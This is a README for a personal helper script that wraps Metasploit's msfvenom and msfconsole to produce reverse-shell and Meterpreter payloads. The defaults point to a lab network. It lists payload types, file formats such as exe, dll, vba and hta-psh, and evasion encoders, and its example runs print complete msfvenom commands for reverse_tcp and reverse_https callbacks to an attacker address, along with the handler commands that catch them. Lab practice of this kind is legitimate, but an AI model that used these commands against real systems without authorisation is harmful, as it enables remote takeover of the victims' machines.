# Shells
This repository is a helper script for msfvenom and msfconsole because I am lazy.

## Installation
No installation requirements other than metasploit, but for maximum fun I would create an alias:  
```bash
python3 setup.py
```

## Usage
Defaults are tun0 network adapter IP for LHOST and 443 for LPORT.  If you have an active network adapter you do not need to pass args.

Each option has a default, if you just hit enter through all the prompts it will give you a shell.exe, and if you choose option 10 on the first screen, and enter through the rest it will give you an elf file.  Display the output to the terminal if you need to get shellcode. 
```bash
python3 shells.py
```
```bash
python3 shells.py 10.10.255.254 9001
```

## Example
```bash
❯ python3 shells.py
WINDOWS PAYLOADS
1. windows/x64/meterpreter/reverse_https
2. windows/meterpreter_reverse_https
3. windows/meterpreter/reverse_https
4. windows/x64/meterpreter/reverse_tcp
5. windows/meterpreter/reverse_tcp
6. windows/shell_reverse_tcp
7. windows/shell/reverse_tcp
LINUX PAYLOADS
8. linux/x64/meterpreter_reverse_https
9. linux/x86/meterpreter_reverse_https
10. linux/x64/meterpreter/reverse_tcp
11. linux/x86/meterpreter/reverse_tcp
12. linux/x64/shell_reverse_tcp
13. linux/x86/shell_reverse_tcp
14. linux/x64/shell/reverse_tcp
15. linux/x86/shell/reverse_tcp
Choose a payload (1-13): 10
FORMATS
1. exe/elf (default)
2. python
3. perl
4. ps1
5. csharp
6. c
7. dll
8. vbapplication
9. vbs
10. vba
11. hta-psh
12. asp
13. aspx
14. jsp
15. sh
16. raw
17. msi
18. war
19. jar
Choose a format by number (1-19) or name:
ENCRYPTION
1. none
2. aes256
3. rc4
4. xor
Choose an encryption type (1-4):
ENCODERS
1. none (default)
2. x86/shikata_ga_nai
3. x64/xor
4. x64/xor_dynamic
5. x64/zutto_dekiru
Choose an encoder by number (1-5) or name:
OUTPUT TYPE
1. File (default)
2. Terminal
Choose an output type (1-2): shell

Shellcode:
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: shell

msfvenom command:
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=443 -f elf -o shell

msfconsole command:
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.2; set LPORT 443; set ExitOnSession false; exploit -j"
```

```bash
❯ python3 shells.py 10.10.255.254 9001
WINDOWS PAYLOADS
1. windows/x64/meterpreter/reverse_https
2. windows/meterpreter_reverse_https
3. windows/meterpreter/reverse_https
4. windows/x64/meterpreter/reverse_tcp
5. windows/meterpreter/reverse_tcp
6. windows/shell_reverse_tcp
7. windows/shell/reverse_tcp
LINUX PAYLOADS
8. linux/x64/meterpreter_reverse_https
9. linux/x86/meterpreter_reverse_https
10. linux/x64/meterpreter/reverse_tcp
11. linux/x86/meterpreter/reverse_tcp
12. linux/x64/shell_reverse_tcp
13. linux/x86/shell_reverse_tcp
14. linux/x64/shell/reverse_tcp
15. linux/x86/shell/reverse_tcp
Choose a payload (1-13):
FORMATS
1. exe/elf (default)
2. python
3. perl
4. ps1
5. csharp
6. c
7. dll
8. vbapplication
9. vbs
10. vba
11. hta-psh
12. asp
13. aspx
14. jsp
15. sh
16. raw
17. msi
18. war
19. jar
Choose a format by number (1-19) or name:
ENCRYPTION
1. none
2. aes256
3. rc4
4. xor
Choose an encryption type (1-4):
ENCODERS
1. none (default)
2. x86/shikata_ga_nai
3. x64/xor
4. x64/xor_dynamic
5. x64/zutto_dekiru
Choose an encoder by number (1-5) or name:
OUTPUT TYPE
1. File (default)
2. Terminal
Choose an output type (1-2): shell.exe

Shellcode:
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 592 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe

msfvenom command:
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.255.254 LPORT=9001 -f exe -o shell.exe

msfconsole command:
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 10.10.255.254; set LPORT 9001; set EnableStageEncoding true; set StagerVerifySSLCert true; set HandlerSSLCert /key/custom.pem; set ExitOnSession false; exploit -j"
```
